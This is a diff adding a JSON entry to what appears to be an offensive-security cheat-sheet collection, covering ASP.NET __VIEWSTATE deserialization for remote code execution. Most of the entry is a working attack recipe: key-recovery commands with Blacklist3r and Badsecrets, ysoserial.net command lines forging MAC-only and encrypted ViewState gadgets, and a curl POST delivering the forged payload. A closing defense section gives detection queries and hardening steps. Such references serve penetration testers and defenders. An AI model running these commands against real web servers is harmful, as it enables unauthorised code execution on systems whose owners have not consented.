@@ -1,0 +1,108 @@
+{
+  "id": "deser-dotnet-viewstate",
+  "name": "ASP.NET __VIEWSTATE Deserialization Abuse",
+  "command": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"<command>\" --generator=<generator> --validationkey=<key> --validationalg=<alg>",
+  "description": "ASP.NET serializes page state into the __VIEWSTATE field using LosFormatter/ObjectStateFormatter. If the machineKey (validation/decryption keys) is known or leaked from web.config, an attacker forges a signed, optionally encrypted ViewState carrying a ysoserial.net gadget (TextFormattingRunProperties) that the server deserializes into remote code execution. Keys are recovered with Blacklist3r or Badsecrets, or by abusing default/leaked keys.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Web Exploitation",
+  "subcategory": "Deserialization",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "pwntester/ysoserial.net; NytroRST/Blacklist3r",
+  "tags": [
+    "deserialization",
+    "viewstate",
+    "aspnet",
+    "machinekey",
+    "blacklist3r",
+    "badsecrets",
+    "rce"
+  ],
+  "mitre": [
+    "T1190",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHEN IS VIEWSTATE EXPLOITABLE ===\n  # __VIEWSTATE is a base64 blob in every classic ASP.NET WebForms page.\n  # Exploitable if you know the machineKey, OR validation is disabled (EnableViewStateMac=false, legacy),\n  # OR the app uses a leaked/default key.\n\n=== STEP 1: RECOVER THE MACHINEKEY ===\n  # Blacklist3r (AspDotNetWrapper) brute-forces known/leaked keys against a captured ViewState:\n  AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <viewstate> --purpose=viewstate --modifier=<generator> --macdecode\n  # Badsecrets (python) does the same offline:\n  python3 -m badsecrets.examples.blacklist3r --url https://<target>/page.aspx\n  # Keys also leak via LFI/source disclosure of web.config <machineKey validationKey=... decryptionKey=...>.\n\n=== STEP 2: FIND THE __VIEWSTATEGENERATOR ===\n  # The hidden __VIEWSTATEGENERATOR field (e.g. CA0B0334) is the --generator value.\n\n=== STEP 3: FORGE THE RCE VIEWSTATE ===\n  # MAC only (no encryption):\n  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --generator=<generator> --validationalg=SHA1 --validationkey=<validationkey>\n  # MAC + encryption (modern default):\n  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --path=\"/page.aspx\" --apppath=\"/\" --decryptionalg=AES --decryptionkey=<decryptionkey> --validationalg=HMACSHA256 --validationkey=<validationkey>\n  # URL-encode the output and POST it as __VIEWSTATE.\n\n=== DELIVERY ===\n  curl -s https://<target>/page.aspx --data-urlencode \"__VIEWSTATE=<forged>\" --data \"__VIEWSTATEGENERATOR=<generator>\"\n\n=== ALTERNATIVES ===\n  Generic ysoserial.net formatters when the sink is not ViewState - see deser-dotnet-ysoserial\n  CVE-2020-0688 (Exchange ECP) ships a hardcoded default validationKey for exactly this attack",
+  "examples": [
+    {
+      "label": "Recover keys offline with Badsecrets",
+      "command": "python3 -m badsecrets.examples.blacklist3r --url https://<target>/page.aspx"
+    },
+    {
+      "label": "Forge MAC-only ViewState RCE",
+      "command": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --generator=<generator> --validationalg=SHA1 --validationkey=<key>"
+    },
+    {
+      "label": "Forge encrypted ViewState RCE",
+      "command": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"whoami\" --path=\"/x.aspx\" --apppath=\"/\" --decryptionalg=AES --decryptionkey=<dkey> --validationalg=HMACSHA256 --validationkey=<vkey>"
+    }
+  ],
+  "references": [
+    {
+      "title": "pwntester/ysoserial.net - ViewState plugin",
+      "url": "https://github.com/pwntester/ysoserial.net"
+    },
+    {
+      "title": "NytroRST/Blacklist3r",
+      "url": "https://github.com/NytroRST/Blacklist3r"
+    },
+    {
+      "title": "PortSwigger - Exploiting ASP.NET ViewState",
+      "url": "https://portswigger.net/web-security/deserialization/exploiting"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "deser-dotnet-ysoserial",
+      "note": "Core ysoserial.net gadgets/formatters this builds on.",
+      "rel": "prereq"
+    },
+    {
+      "id": "exploit-deserialization",
+      "note": "Generic multi-language deserialization hub card.",
+      "rel": "alternative"
+    },
+    {
+      "id": "deser-java-ysoserial",
+      "note": "Java equivalent serialized-object abuse.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "ViewState is a serialized object graph. When the signing/encryption machineKey is weak, default, or leaked, an attacker can forge a valid ViewState carrying a gadget, and ObjectStateFormatter deserializes it server-side into code execution. Disabling ViewState MAC removes the integrity check entirely.",
+    "prerequisites": "A classic ASP.NET WebForms endpoint plus a known/leaked/default machineKey, or an app with ViewState MAC validation disabled.",
+    "impact": "Remote code execution in the IIS worker process as the app-pool identity.",
+    "detection": "[MITRE T1190] Oversized or malformed __VIEWSTATE POST bodies, repeated ViewState MAC validation failures (Event ID 4009 / ViewStateException in the application log); [MITRE T1059] w3wp.exe spawning shells.",
+    "artifacts": "IIS logs with large __VIEWSTATE POSTs; Windows Application log ASP.NET ViewState MAC validation errors; Sysmon/EDR w3wp.exe -> cmd.exe process tree; new files under the site temp dir.",
+    "splunk_spl": "index=iis cs_method=POST (cs_uri_query=\"*__VIEWSTATE*\" OR request_body=\"*__VIEWSTATE*\")\n| eval vs_len=len(request_body)\n| where vs_len > 2000\n| table _time, c_ip, cs_uri_stem, vs_len",
+    "elastic_kql": "http.request.method:POST and http.request.body.content:*__VIEWSTATE* and event.code:\"4009\"",
+    "sentinel_kql": "Event\n| where Source has \"ASP.NET\" and (RenderedDescription has \"ViewState\" and RenderedDescription has \"validation\")\n| project TimeGenerated, Computer, RenderedDescription",
+    "sigma_rules": "web_aspnet_viewstate_mac_validation_failure",
+    "prevention": "Keep EnableViewStateMac on; rotate machineKeys and never ship default/leaked keys; use AutoGenerate,IsolateApps keys; prefer DPAPI-protected keys; patch Exchange (CVE-2020-0688); restrict web.config disclosure; run app pools least-privileged.",
+    "sources": [
+      "pwntester/ysoserial.net",
+      "https://portswigger.net/web-security/deserialization/exploiting"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Repeated ASP.NET ViewState MAC validation failures",
+        "logic": "Event\n| where EventLog == \"Application\" and Source has \"ASP.NET\"\n| where RenderedDescription has \"ViewState\" and RenderedDescription has_any (\"MAC\",\"validation\",\"could not be verified\")\n| summarize Count=count() by Computer, bin(TimeGenerated, 10m)\n| where Count > 3",
+        "data_source": "windows-application",
+        "attack": [
+          "T1190"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Key rotation or load-balanced nodes with mismatched machineKeys",
+        "tuning": "Correlate failures with a following w3wp.exe child shell to raise confidence"
+      }
+    ]
+  }
+}
